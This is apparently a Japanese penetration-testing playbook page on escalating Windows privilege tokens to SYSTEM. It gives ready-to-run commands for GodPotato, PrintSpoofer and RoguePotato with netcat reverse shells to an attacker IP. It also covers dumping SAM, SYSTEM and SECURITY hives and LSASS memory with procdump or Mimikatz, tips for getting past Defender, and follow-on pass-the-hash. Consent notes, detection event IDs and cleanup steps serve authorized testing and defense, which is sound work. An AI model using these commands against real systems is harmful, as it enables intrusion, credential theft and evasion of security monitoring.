# Windows 特権トークン悪用

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（LSASS アクセスは Defender for Endpoint / EDR が確実に検知。Token Impersonation は Event ID 4624 Type 3 / 4648 で記録）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

> **スコープ**: `whoami /all` で特権トークンを確認後 → 各特権に対応した権限昇格まで。特権の確認手順は `./Enumeration_Checklist.md`（Step 1）を参照。

## 着火条件

`whoami /all` の Privileges 欄に以下のいずれかが `Enabled` で出ている場合：

| 特権 | 対応ブロック |
|------|------------|
| `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` | §1 Potato 系攻撃 |
| `SeBackupPrivilege` / `SeRestorePrivilege` | §2 SAM/SYSTEM ダンプ |
| `SeDebugPrivilege` | §3 LSASS ダンプ |
| `SeTakeOwnershipPrivilege` | §4 SAM バックアップ取得 |

## 環境前提

- 実行環境: ターゲット（Windows シェル内）でダンプ取得・ツール実行、テスター端末で解析
- ツールは各ブロックに記載

---

## 1. SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege — Potato 系攻撃

### 着火条件

`SeImpersonatePrivilege` または `SeAssignPrimaryTokenPrivilege` が `Enabled`。
典型的な付与コンテキスト: IIS アプリプール（`iis apppool\[サイト名]`）・MSSQL サービスアカウント。

**攻撃者の思考トレース**: これらの特権は「サービスが別ユーザーに成りすます」ために Windows が正規に付与するもの。悪用はすなわち「そのサービスアカウントが SYSTEM トークンを借用できる」という構造的問題。

**環境判定フロー（何を試すか）:**

| シグナル | 試すツール |
|---------|----------|
| Windows Server 2019 / 2022 または Windows 10/11（64bit） | **GodPotato** を最初に試す |
| Windows Server 2016 以前 / Print Spooler サービスが `Running` | **PrintSpoofer** を最初に試す |
| Print Spooler が `Stopped` かつ比較的古い OS（2016 以前） | **RoguePotato** を試す |

```powershell
# [Target] Print Spooler の状態確認
sc query spooler
# STATE: 4 RUNNING → PrintSpoofer が使える可能性が高い
# STATE: 1 STOPPED → PrintSpoofer は使えない
```

**コマンド（GodPotato — 推奨）:**

> **GodPotato とは:** .NET CLR の COM オブジェクト活性化を悪用して SYSTEM トークンを取得する Potato 系ツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。Windows Server 2012 以降の全バージョンで動作報告あり。

**事前準備（必須）:** テスター端末で HTTP サーバーを起動してバイナリを配信し、リスナーを起動してから実行する。

```bash
# [Attacker] HTTP サーバーでバイナリを配信
python3 -m http.server 8888

# [Attacker] リスナー起動（別ターミナル）
nc -lvnp [ATTACKER_PORT]
```

```powershell
# [Target] バイナリをダウンロードして実行
iwr "http://[ATTACKER_IP]:8888/GodPotato.exe" -OutFile "C:\Windows\Temp\GodPotato.exe"

# 権限確認
C:\Windows\Temp\GodPotato.exe -cmd "cmd /c whoami"
# nt authority\system が出ることを確認

# リバースシェル取得
C:\Windows\Temp\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe [ATTACKER_IP] [ATTACKER_PORT] -e cmd"
```

**コマンド（PrintSpoofer — Print Spooler Running の場合）:**

> **PrintSpoofer とは:** Print Spooler サービスの名前付きパイプを利用して SYSTEM トークンを取得するツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。

```powershell
# [Target]
iwr "http://[ATTACKER_IP]:8888/PrintSpoofer64.exe" -OutFile "C:\Windows\Temp\PrintSpoofer64.exe"
C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd
# または
C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe [ATTACKER_IP] [ATTACKER_PORT] -e cmd"
```

**コマンド（RoguePotato — フォールバック）:**

> **RoguePotato とは:** DCOM リモートアクティベーションと偽 OXID リゾルバを組み合わせて SYSTEM トークンを取得するツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。

**事前準備（必須）:** テスター端末で偽 OXID リゾルバ用ポートリダイレクトを起動する。

```bash
# [Attacker] socat で 135/tcp をリダイレクト
socat TCP-LISTEN:135,fork,reuseaddr TCP:127.0.0.1:[ROGUE_PORT] &
```

```powershell
# [Target]
C:\Windows\Temp\RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\Temp\nc.exe [ATTACKER_IP] [ATTACKER_PORT] -e cmd" -l [ROGUE_PORT]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `whoami` → `nt authority\system` | SYSTEM 昇格成功 | 横展開観点を確認 |
| `Named pipe connection error` | 対応するサービスが停止中 | GodPotato に切り替える |
| `COM error -2147221008` | .NET ランタイムバージョン不一致 | RoguePotato に切り替える |
| すべての Potato 系が失敗 | Defender が EXE をブロック | `./Enumeration_Checklist.md`（Step 8 AMSI バイパス）を参照 |

**注意:** ビルド済みバイナリは AV/EDR に検知される場合がある。本番では難読化ビルドまたはメモリ上のみで実行することを合意の上で検討する。

---

## 2. SeBackupPrivilege / SeRestorePrivilege — SAM/SYSTEM ダンプ

### 着火条件

`SeBackupPrivilege` または `SeRestorePrivilege` が `Enabled`。
典型的な付与コンテキスト: Backup Operators グループメンバー、バックアップエージェントのサービスアカウント。

**攻撃者の思考トレース**: SeBackupPrivilege は「ファイルシステムの DACL を無視して読み取れる」権限。SAM・SYSTEM・SECURITY の 3 ハイブをレジストリ経由でバックアップし、テスター端末でオフライン解析する。

**必要なツール:** `reg save`（Windows 標準）、`impacket-secretsdump`（ペネトレ用 Linux ディストリ標準搭載）

**事前準備（必須）:** 書き込み可能な一時ディレクトリを確認する（`echo test > C:\Windows\Temp\test.txt`）。

**コマンド:**

```powershell
# [Target] レジストリハイブをファイルに保存
reg save HKLM\SAM      C:\Windows\Temp\sam.hive      /y
reg save HKLM\SYSTEM   C:\Windows\Temp\system.hive   /y
reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y

# ファイルをテスター端末にダウンロード（evil-winrm の場合）
download C:\Windows\Temp\sam.hive
download C:\Windows\Temp\system.hive
download C:\Windows\Temp\security.hive
```

```bash
# [Attacker] ハッシュを解析
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

**観測される出力 → 次のアクション:**

出力例（`impacket-secretsdump` の典型的な出力）:

```
[*] Target system bootKey: 0x[BOOTKEY]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
[USER]:1001:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
[*] Dumping cached domain logon information (domain/username:hash)
[DOMAIN]/[DOMAIN_USER]:$DCC2$10240#[DOMAIN_USER]#[MSCACHE_HASH]
[*] Dumping LSA Secrets
[VARIOUS_LSA_SECRETS]
```

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Administrator:500:...[NTLM_HASH]` | ローカル管理者の NTLM ハッシュ | `../Credential_Dumping.md` §2 Pass-The-Hash |
| `$DCC2$...` エントリ | キャッシュドドメインクレデンシャル | hashcat `-m 2100` でクラック |
| LSA Secrets セクション | サービスアカウントのパスワード | 取得した平文パスワードで他サービスに認証 |

**注意:** `reg save` が `Access Denied` の場合、SeBackupPrivilege が Disabled になっている。PowerShell で `Enable-Privilege SeBackupPrivilege` を試みる（要 PS スクリプト）。

---

## 3. SeDebugPrivilege — LSASS ダンプ

> **[HIGH IMPACT]** 本手法は LSASS プロセスへの直接アクセスを行うため、EDR/Defender for Endpoint で確実に検知される。本番では最高優先度の合意事項。

### 着火条件

`SeDebugPrivilege` が `Enabled`（Local Administrators グループメンバーに付与されていることが多い）。

**攻撃者の思考トレース**: SeDebugPrivilege は「任意プロセスのメモリに読み書きする」権限。LSASS はアクティブなユーザーセッションの認証情報（NT ハッシュ・Kerberos チケット・場合によっては平文パスワード）をメモリ上に保持しているため、これを読み取ることで認証情報を取得できる。

**必要なツール（選択肢）:**

- `procdump.exe`（Sysinternals、別途転送要）+ `pypykatz`（ペネトレ用 Linux ディストリ標準搭載）→ ステルス性高
- `Mimikatz`（別途転送要）→ 検知率が高い

**コマンド（方法A — procdump でダンプしてテスター端末で解析）:**

```powershell
# [Target] procdump でダンプ
C:\Windows\Temp\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# ダウンロード（evil-winrm の場合）
download C:\Windows\Temp\lsass.dmp
```

```bash
# [Attacker] pypykatz で解析
pypykatz lsa minidump lsass.dmp
```

**コマンド（方法B — Mimikatz で直接実行）:**

> **Mimikatz とは:** Windows の認証情報をメモリから取得するツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。EDR/AV による検知率が高い。

**事前準備（必須）:** Mimikatz.exe を転送しておく。Defender が有効な場合はブロックされる可能性が高い。

```powershell
# [Target] Mimikatz を実行
C:\Windows\Temp\mimikatz.exe
# Mimikatz プロンプト内
privilege::debug
sekurlsa::logonpasswords
sekurlsa::dpapi    # DPAPI マスターキーの取得（→ ./DPAPI_Browser_Creds.md で利用）
```

**観測される出力 → 次のアクション:**

```
== MSV ==
Username: [USER]
Domain: [DOMAIN]
NT: [NTLM_HASH]
== DPAPI ==
MasterKey: [DPAPI_MASTERKEY]
```

| 出力フィールド | 用途 |
|--------------|------|
| `NT: [NTLM_HASH]` | `./Credential_Dumping.md` §2 Pass-The-Hash |
| `DPAPI MasterKey:` | `./DPAPI_Browser_Creds.md` でブラウザ保存パスワード復号 |
| `password:` が空でない（古い OS・WDigest 有効）| 平文パスワードが直接取得できる |

**刺さらなかったとき（SeDebug / LSASS ダンプ）:**

| 現象 | 原因 | 代替 |
|------|------|------|
| Defender がダンプファイルを削除 | リアルタイム保護が有効 | Exclusion パスへ移動（`C:\Windows\Temp` が検知される場合は `C:\Users\Public\` を試す）|
| procdump でダンプが作成されるが 0 バイト | PPL（Protected Process Light）が LSASS に設定されている | `--bypass-ppl` オプションまたは代替ダンプツール |
| LSASS の NT ハッシュが取れるが平文パスワードが None | WDigest 無効（Windows 8.1/2012R2 以降のデフォルト）| NTLM ハッシュで Pass-The-Hash を試みる |

---

## 4. SeTakeOwnershipPrivilege — SAM バックアップ取得

### 着火条件

`SeTakeOwnershipPrivilege` が `Enabled`。

**攻撃者の思考トレース**: SeTakeOwnership は「ファイル/レジストリキーのオーナーシップを強制的に自分に変更できる」権限。DACL で読み取りを禁じられていても、オーナー変更 → DACL 変更 → 読み取りの 3 ステップで保護ファイルにアクセスできる。

**必要なツール:** `takeown`・`icacls`（Windows 標準搭載）、`impacket-secretsdump`（テスター端末で解析）

**コマンド:**

```powershell
# [Target] SAM ハイブのオーナーを自分に変更
takeown /F C:\Windows\System32\config\SAM

# 自分に読み取り権限を付与
icacls C:\Windows\System32\config\SAM /grant [USER]:F

# ファイルをコピー
copy C:\Windows\System32\config\SAM    C:\Windows\Temp\sam.hive
copy C:\Windows\System32\config\SYSTEM C:\Windows\Temp\system.hive

# ダウンロード（evil-winrm の場合）
download C:\Windows\Temp\sam.hive
download C:\Windows\Temp\system.hive
```

```bash
# [Attacker] ハッシュを解析
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

**原状回復（必須）:**

```powershell
# [Target] DACL を元に戻す
icacls C:\Windows\System32\config\SAM /remove [USER]

# オーナーを Administrators グループに戻す
takeown /F C:\Windows\System32\config\SAM /A
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Administrator:500:...[NTLM_HASH]` | ローカル管理者の NTLM ハッシュ | `../Credential_Dumping.md` §2 Pass-The-Hash |
| `takeown` で `Access Denied` | SeTakeOwnership が Disabled | Mimikatz `privilege::debug` の後に試みる |
| SAM を copy できない（ファイルロック） | OS がハイブをロック中 | `reg save` コマンドを使う（§2 SeBackup セクション参照）|

**注意:** オーナー変更・DACL 変更は監査ログ（Event ID 4670・4674）に記録される。変更した DACL は必ず原状回復する。

---

## 刺さらなかったとき（全体）

| 現象 | 推定原因 | 代替 |
|------|---------|------|
| `SeImpersonate: Disabled` と表示される | トークン調整権限が剥奪済み | SeBackup / SeRestore / SeDebug を確認する |
| すべての Potato 系が失敗し AMSI もブロック | EDR が完全に動作をブロック | `./BYOVD.md` を参照（カーネルレベルの EDR 無効化） |
| LSASS ダンプが常に削除される | AV リアルタイム保護 | 代替パスへの出力 / procdump 以外のダンプツールを試す |
| `reg save` が `Access Denied` | 管理者権限不足 | SeBackup が Disabled か確認 |

---

## 昇格成功後に確認すること（横展開観点）

特権トークン悪用で SYSTEM または管理者権限を得たら、以下を確認する（「権限取得 = ゴール」ではない）：

- **SAM / LSASS から取得した NTLM ハッシュ** → Pass-The-Hash で他ホストへの接続性確認
- **DPAPI マスターキー（pypykatz / Mimikatz `sekurlsa::dpapi`）** → ブラウザ保存パスワード・Credential Manager の復号（→ `./DPAPI_Browser_Creds.md`）
- **LSASS の Kerberos チケット（pypykatz / Mimikatz `sekurlsa::tickets`）** → Pass-The-Ticket で他ホストへのアクセス
- **LSA Secrets（impacket-secretsdump）** → サービスアカウントのパスワード・AD マシンアカウントのシークレット
- **キャッシュドドメインクレデンシャル（`$DCC2$`）** → hashcat でクラックしてドメインパスワードを取得
- **LAPS `ms-Mcs-AdmPwd` 属性** → 他ホストのローカル管理者パスワード
- **BloodHound で取得した SYSTEM ホストからの次のエッジ** → ACE Abuse / Kerberos Attacks への接続を確認

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。LSASS ダンプはドメイン内すべての認証情報に波及する操作
- **想定されるSIEM/EDR検知**:
  - LSASS アクセス → Defender for Endpoint の「LSASS Memory Access」アラート（確実に検知）
  - procdump / Mimikatz の EXE 実行 → AV シグネチャ検知（Event ID 4688 プロセス作成）
  - `reg save` による SAM/SYSTEM バックアップ → Event ID 4663（オブジェクトアクセス）
  - `takeown` / `icacls` による DACL 変更 → Event ID 4670・4674
  - Token Impersonation → Event ID 4624 Type 3 / 4648
  - **Sysmon Event ID 10（ProcessAccess）**: procdump / Mimikatz が `lsass.exe` にアクセスする際に記録。GrantedAccess `0x1010`（読み取り専用）/ `0x1410` などが検知トリガー
  - **Sysmon Event ID 1（Process Create）**: GodPotato / PrintSpoofer / RoguePotato の EXE 起動時に記録
  - **Sysmon Event ID 17/18（PipeEvent）**: Potato 系攻撃が偽の名前付きパイプを作成・接続する際に記録
  - **EDR アラート名（例）**: CrowdStrike「Potential Token Impersonation via Named Pipe」、Defender for Endpoint「Suspicious process accessed LSASS memory」
- **業務影響リスク**: なし（読み取り操作のみ。LSASS アクセスは OS 安定性に低確率で影響する可能性あり）
- **原状回復必須項目**:
  - ✅ `C:\Windows\Temp\*.hive` / `*.dmp` の削除
  - ✅ `takeown` / `icacls` で変更した DACL の原状回復
  - ✅ 取得した NTLM ハッシュ・平文パスワードの暗号化保管 → テスト完了時破棄
  - ✅ 転送したツールバイナリ（GodPotato / PrintSpoofer / procdump 等）の削除
- **取得情報の取扱**: NTLM ハッシュ・平文パスワードは暗号化保管、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：`whoami /all` で特権トークンを確認 → `./Enumeration_Checklist.md`（Step 1）
- 前：IIS / MSSQL サービスアカウントとして初期シェル取得 → `../02_Initial_Access/MSSQL_Exploitation.md`
- 後：取得した NTLM ハッシュで Pass-The-Hash → `./Credential_Dumping.md`
- 後：DPAPI マスターキー → ブラウザ保存パスワード復号 → `./DPAPI_Browser_Creds.md`
- 後：LSASS の Kerberos チケット → `./Kerberos_Attacks/Pass_The_Ticket.md`
- 後：取得したハッシュのクラック → `../05_Tools_Reference/Hashcat.md`
